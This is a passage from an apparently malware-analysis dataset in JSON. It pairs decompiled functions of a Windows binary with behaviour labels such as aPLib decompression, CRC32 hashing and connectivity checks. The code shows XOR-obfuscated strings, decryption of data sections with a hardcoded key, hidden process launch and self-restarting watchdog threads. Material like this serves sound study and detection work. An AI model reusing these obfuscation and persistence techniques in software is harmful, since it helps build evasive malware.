4);\n                        var_24h = uVar5;\n                        iVar8 = (**(*ppv + 0x18))(ppv, uVar5, 0x410330, &var_18h);\n                        if ((-1 < iVar8) && (var_18h != NULL)) {\n                            pszFirst = 0;\n                            var_4h = NULL;\n                            iVar8 = (**(*var_18h + 0x84))(var_18h, &pszFirst);\n                            if ((-1 < iVar8) && (pszFirst != 0)) {\n                                iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x41ccc0);\n                                if ((iVar8 != 0) &&\n                                   ((iVar8 = (**(*var_18h + 0x8c))(var_18h, &var_4h),  -1 < iVar8 && (var_4h != NULL))))\n                                {\n                                    iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_4h, piVar6);\n                                    piVar4 = var_4h;\n                                    if ((iVar8 != 0) &&\n                                       (((*var_4h == 0x22 && (var_4h[2] == 0x3a)) && (var_4h[3] == 0x5c)))) {\n                                        puVar9 = &lpFileName;\n                                        for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n                                            *puVar9 = 0;\n                                            puVar9 = puVar9 + 1;\n                                        }\n                                        piVar10 = piVar6;\n                                        do {\n                                            iVar2 = *piVar10;\n                                            piVar10 = piVar10 + 1;\n                                        } while (iVar2 != var_34h);\n                                        iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(piVar4, piVar6);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_4h + 1, \n                                                   ((iVar8 - var_4h >> 1) - 2) + (piVar10 - (piVar6 + 1) >> 1));\n                                        iVar8 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        uVar5 = var_24h;\n                                        if (iVar8 == -1) {\n                                            (**(*ppv + 0x1c))(ppv, var_24h);\n                                        }\n                                    }\n                                    (*pcVar3)(var_4h);\n                                }\n                                (*pcVar3)(pszFirst);\n                            }\n                            (**(*var_18h + 8))(var_18h);\n                        }\n                        (*pcVar3)(uVar5);\n                    } while (var_10h != 0);\n                    (*pcVar3)(var_1ch);\n                    iVar8 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                }\n                (**(*var_20h + 8))(var_20h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    return;\n}\n",
        "token_count": 1443
    },
    "0040bd2f": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040bd2f(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t *piVar10;\n    int32_t iVar11;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar11 = param_1 - *(param_1[0xf] + 0x34 + param_1);\n    iVar3 = *(param_1[0xf] + 0xa0 + param_1);\n    if (iVar3 == 0) {\ncode_r0x0040bde2:\n        uVar8 = 0;\n    }\n    else {\n        piVar10 = iVar3 + param_1;\n        if (piVar10 != param_1) {\n            while( true ) {\n                iVar3 = piVar10[1];\n                if (iVar3 == 0) break;\n                iVar4 = *piVar10;\n                piVar5 = piVar10 + 2;\n                uVar7 = iVar3 - 8U >> 1;\n                while (uVar7 != 0) {\n                    uVar7 = uVar7 - 1;\n                    uVar9 = *piVar5;\n                    uVar6 = *piVar5 >> 0xc;\n                    if (uVar6 != 0) {\n                        if (uVar6 == 1) {\n                            piVar2 = param_1 + (uVar9 & 0xfff) + iVar4;\n                            *piVar2 = *piVar2 + (iVar11 >> 0x10);\n                        }\n                        else if (uVar6 == 2) {\n                            piVar2 = param_1 + (uVar9 & 0xfff) + iVar4;\n                            *piVar2 = *piVar2 + iVar11;\n                        }\n                        else {\n                            if ((uVar6 != 3) && (uVar6 != 10)) goto code_r0x0040bde2;\n                            piVar1 = param_1 + (uVar9 & 0xfff) + iVar4;\n                            *piVar1 = *piVar1 + iVar11;\n                        }\n                    }\n                    piVar5 = piVar5 + 2;\n                }\n                piVar10 = piVar10 + piVar10[1];\n            }\n        }\n        uVar8 = 1;\n    }\n    return uVar8;\n}\n",
        "token_count": 582
    },
    "0040d0a4": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040d0a4(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    code *pcVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uint32_t in_EDX;\n    int32_t iVar10;\n    uint32_t uVar11;\n    code *pcVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int16_t *var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint var_2ch;\n    uint16_t *var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t lpFindFileData;\n    int32_t lpBuffer;\n    int16_t *lpMem;\n    int32_t var_4h;\n    \n    pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar13 = 0;\n    var_24h = 0;\n    var_34h = 0;\n    var_4h = 0;\n    var_1ch = in_EDX;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x250);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    if (lpFindFileData == 0) {\n        return 0;\n    }\n    uVar5 = (*pcVar12)(8, 0x208);\n    lpBuffer = (*pcVar4)(uVar5);\n    if (lpBuffer == 0) goto code_r0x0040d354;\n    uVar5 = (*pcVar12)(8, 0x208);\n    lpMem = (*pcVar4)(uVar5);\n    if (lpMem != NULL) {\n        var_48h = 0x415b502a;\n        var_44h = 0x71357640;\n        var_40h = 0x50136e39;\n        piVar6 = lpMem;\n        for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        var_3ch._0_2_ = 0x4171;\n        var_30h = 0x41715076;\n        var_2ch._0_1_ = 0x6e;\n        uVar5 = (*pcVar12)(8, 0x1d);\n        piVar6 = (*pcVar4)(uVar5);\n        iVar8 = lpBuffer;\n        iVar14 = 0;\n        var_38h = piVar6;\n        do {\n            var_20h = 5;\n            puVar1 = iVar14 + piVar6;\n            iVar10 = iVar14 % 5;\n            iVar14 = iVar14 + 1;\n            *puVar1 = *(&var_30h + iVar10) ^ puVar1[&var_48h - piVar6];\n            pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        } while (iVar14 < 0xe);\n        piVar9 = piVar6;\n        do {\n            iVar2 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar2 != 0);\n        iVar14 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpBuffer, 0x103 - (piVar9 - (piVar6 + 1) >> 1));\n        if (iVar14 == 0) {\ncode_r0x0040d326:\n            uVar5 = (*pcVar12)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            uVar13 = var_34h;\n        }\n        else {\n            if (var_18h == 0) {\n                var_1ch = fcn.00406585();\n                var_1ch = var_1ch & 0xff;\n                arg_8h = fcn.00406585();\n                arg_8h = arg_8h & 0xff;\n            }\n            var_14h = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar8, piVar6);\n            var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar8, lpFindFileData);\n            if (var_18h == -1) goto code_r0x0040d326;\n            iVar8 = lpFindFileData;\n            iVar14 = lpBuffer;\n            for (uVar13 = 0; (uVar13 <= var_1ch || (uVar13 <= var_14h)); uVar13 = uVar13 + 1) {\n                if ((uVar13 == var_1ch) || (uVar13 == var_14h)) {\n                    iVar10 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar8 + 0x2c, 0, 0x2e);\n                    var_34h = (iVar10 + (-0x2c - iVar8) >> 1) >> 1;\n                    var_20h = 0;\n                    if ((var_4h != 0) && (var_20h = var_34h - 4,  var_34h < var_20h)) {\n                        var_20h = 0;\n                    }\n                    if (4 < var_34h) {\n                        var_34h = 4;\n                    }\n                    piVar6 = lpMem;\n                    do {\n                        iVar2 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar2 != var_24h);\n                    for (piVar6 = lpMem + (piVar6 - (lpMem + 1) >> 1); *piVar6 != 0; piVar6 = piVar6 + 1) {\n                    }\n                    var_28h = iVar8 + (var_20h + 0x16) * 2;\n                    var_20h = *var_28h;\n                    if (*var_28h != 0) {\n                        iVar10 = var_28h - piVar6;\n                        uVar7 = var_20h;\n                        uVar11 = var_34h;\n                        do {\n                            iVar8 = lpFindFileData;\n                            iVar14 = lpBuffer;\n                            if (uVar11 == 0) break;\n                            *piVar6 = uVar7;\n                            piVar6 = piVar6 + 1;\n                            uVar11 = uVar11 - 1;\n                            uVar3 = *(iVar10 + piVar6);\n                            uVar7 = uVar3;\n                        } while (uVar3 != 0);\n                    }\n                    var_4h = var_4h + var_34h;\n                    *piVar6 = 0;\n                    var_30h = var_34h;\n                }\n                iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_18h, iVar8);\n                if (iVar10 == 0) {\n                    var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar14, iVar8);\n                }\n            }\n            *arg_10h = lpMem;\n            lpMem[var_4h] = 0;\n            *arg_14h = var_4h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_18h);\n            pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piVar6 = var_38h;\n            uVar13 = 1;\n        }\n        uVar5 = (*pcVar12)(0, piVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    uVar5 = (*pcVar12)(0, lpBuffer);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\ncode_r0x0040d354:\n    uVar5 = (*pcVar12)(0, lpFindFileData);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    return uVar13;\n}\n",
        "token_count": 1960
    },
    "0040fc42": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040fc42(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 236
    },
    "0040121f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040121f(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint var_32ch;\n    uint var_124h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar10 = &var_124h;\n    for (iVar6 = 0x104; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar10 = &var_32ch;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    if (*0x41ccc8 == 0) {\n        uVar5 = 0;\n        do {\n            if (*(uVar5 + 0x410380) == arg_ch) {\n                if (arg_10h == *0x41ccb8) {\n                    return 1;\n                }\n                if (arg_ch == -0x37b0bf10) {\n                    puVar10 = &var_124h;\n                    for (iVar6 = 0x104; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = 0;\n                        puVar10 = puVar10 + 1;\n                    }\n                    var_124h._0_1_ = 0;\n                    if ((arg_14h != 0) &&\n                       (iVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar6 != 0)) {\n                        (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar6, &var_124h, 0x104);\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar6);\n                    }\n                    pcVar4 = _sym.imp.KERNEL32.dll_lstrlenA;\n                    iVar6 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_124h);\n                    if (iVar6 != 0) {\n                        (*pcVar4)(&var_124h);\n                        iVar6 = fcn.00405de6();\n                        if (iVar6 == -0x37b0bf10) {\n                            return 1;\n                        }\n                    }\n                }\n                iVar6 = fcn.00401cc7();\n                if (iVar6 != 0) {\n                    return 1;\n                }\n                puVar10 = &var_32ch;\n                for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n                iVar6 = fcn.00402665();\n                if (iVar6 == 0) {\n                    return 1;\n                }\n                iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_32ch, 0x41caa8);\n                if (iVar6 != 0) {\n                    return 1;\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040447e, arg_10h, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n                return 1;\n            }\n            uVar5 = uVar5 + 4;\n        } while (uVar5 < 0x1c);\n    }\n    else if ((((arg_ch == 0x74fc6984) && (iVar6 = fcn.00401cc7(),  iVar6 == 0)) && (iVar6 = fcn.00402665(),  iVar6 != 0)\n             ) && (iVar2 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_32ch),  pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap\n                  ,  iVar2 == 0)) {\n        var_18h = 0x1f050b2c;\n        var_14h = 0x5c741629;\n        var_10h = 0x16201559;\n        var_ch._0_1_ = 0x47;\n        var_8h = 0x71776e47;\n        var_4h._0_2_ = 0x7a4c;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        var_20h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar6 = 0;\n        var_1ch = &var_18h - var_20h;\n        do {\n            puVar1 = iVar6 + var_20h;\n            iVar7 = iVar6 % 6;\n            iVar6 = iVar6 + 1;\n            *puVar1 = *(&var_8h + iVar7) ^ puVar1[var_1ch];\n        } while (iVar6 < 0xd);\n        var_14h = 0x52e0014;\n        var_10h = 0x33381e26;\n        var_ch._0_1_ = 0x4a;\n        var_8h = 0x444a6455;\n        var_4h._0_2_ = 0x7152;\n        uVar3 = (*pcVar4)(8, 10);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar6 = var_20h;\n        iVar9 = 0;\n        do {\n            puVar1 = iVar9 + iVar7;\n            iVar8 = iVar9 % 6;\n            iVar9 = iVar9 + 1;\n            *puVar1 = *(&var_8h + iVar8) ^ puVar1[&var_14h - iVar7];\n        } while (iVar9 < 9);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_20h, iVar7);\n        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        (*pcVar4)(&var_32ch);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        *(iVar9 + 8) = arg_10h;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00401bc1, iVar9, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*pcVar4)(uVar3);\n    }\n    return 1;\n}\n",
        "token_count": 1724
    },
    "00401811": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401811(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    int32_t iStack580;\n    uint uStack576;\n    uchar auStack572 [4];\n    uchar auStack568 [16];\n    uchar auStack552 [24];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    puVar7 = auStack568;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = auStack552;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    piVar6 = &iStack528;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *piVar6 = 0;\n        piVar6 = piVar6 + 1;\n    }\n    if (*0x41ccc8 == 0) {\n        *0x41caa4 = fcn.00401931();\n    }\n    else {\n        *0x41caa4 = fcn.00401fde();\n        fcn.0040d697(auStack572);\n    }\n    if (*0x41caa4 == 0) {\n        piVar6 = &iStack528;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - auStack526 >> 1 != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&iStack528);\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        fcn.00402665();\n        iStack580 = *0x41caa4;\n        uStack576 = *0x41ccbc;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &iStack580, 0, 0xffffffff);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(5000);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar4);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41caa4, 0);\n        uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00401811, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        (*pcVar2)(*0x41caa4);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 725
    },
    "00401931": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00401931(uint *param_1)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint lpCommandLine;\n    uint var_68h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = 0x4d1c3913;\n    iVar5 = 0x44;\n    var_18h = 0x314f331d;\n    puVar7 = param_1;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_14h = 0x394b303a;\n    var_10h = 0x334a4d48;\n    puVar7 = &var_68h;\n    var_24h = param_1;\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_68h = 0x44;\n    var_ch._0_2_ = 0x3139;\n    puVar7 = &lpCommandLine;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_8h = 0x4d313933;\n    var_4h._0_1_ = 0x30;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        var_20h = 5;\n        puVar1 = iVar5 + iVar4;\n        iVar6 = iVar5 % 5;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar6) ^ puVar1[&var_1ch - iVar4];\n    } while (iVar5 < 0x12);\n    (*_sym.imp.SHLWAPI.dll_StrCpyW)(&lpCommandLine, *0x41ccc0);\n    (*_sym.imp.SHLWAPI.dll_StrCatW)(&lpCommandLine, iVar4);\n    puVar7 = var_24h;\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0x8000008, 0, 0, &var_68h, var_24h);\n    if (puVar7[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar7[1]);\n    }\n    uVar2 = *puVar7;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar2;\n}\n",
        "token_count": 791
    },
    "00401bc1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401bc1(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    uchar *puStack572;\n    int32_t iStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    puVar7 = &stack0xfffffde0;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &stack0xfffffdf0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (*0x41ccc8 == 0) {\n        puStack572 = 0x401c08;\n        *0x41caa4 = fcn.004025e8();\n    }\n    else {\n        puStack572 = 0x401bfd;\n        *0x41caa4 = fcn.00404069();\n    }\n    if (*0x41caa4 == 0) {\n        piVar6 = &stack0xfffffdf0;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - &stack0xfffffdf2 >> 1 != 0) {\n            puStack572 = &stack0xfffffdf0;\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)();\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        puStack572 = 0x401c1c;\n        fcn.00402665();\n        iStack552 = *0x41caa4;\n        puStack572 = 0xffffffff;\n        uStack548 = *0x41ccbc;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &stack0xfffffdd8, 0);\n        puStack572 = NULL;\n        (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(*0x41caa4, &stack0xfffffdc4);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41caa4, 0);\n        uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00401bc1, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        (*pcVar2)(*0x41caa4);\n    }\n    puStack572 = NULL;\n    (*_sym.imp.KERNEL32.dll_ExitThread)();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 723
    },
    "00401d1b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401d1b(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    \n    if (((*0x41ccc8 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41ccbc, 0xffffffff),  iVar2 == 0))\n       && (*arg_8h == 0x20)) {\n        puVar6 = 0x41caa8;\n        for (iVar2 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.00402665();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar4[1] = arg_8h[2];\n        *piVar4 = arg_8h[1];\n        iVar2 = (*pcVar1)();\n        piVar4[2] = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00401811, piVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x412010) = *(uVar5 + 0x412010) ^ \"jRlV6mNlxd8KrC\"[uVar5 % 0xe];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x4400);\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x416410) = *(uVar5 + 0x416410) ^ *(uVar5 % 0xd + 0x41c610);\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x6200);\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00401e3a, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    while (*0x41cd2c == 0) {\n        fcn.0040101f();\n        if (*0x41ccc8 != 0) {\n            (*pcVar1)(1000);\n        }\n        (*pcVar1)(0x1e);\n    }\n    return 0;\n}\n",
        "token_count": 677
    },
    "004025e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
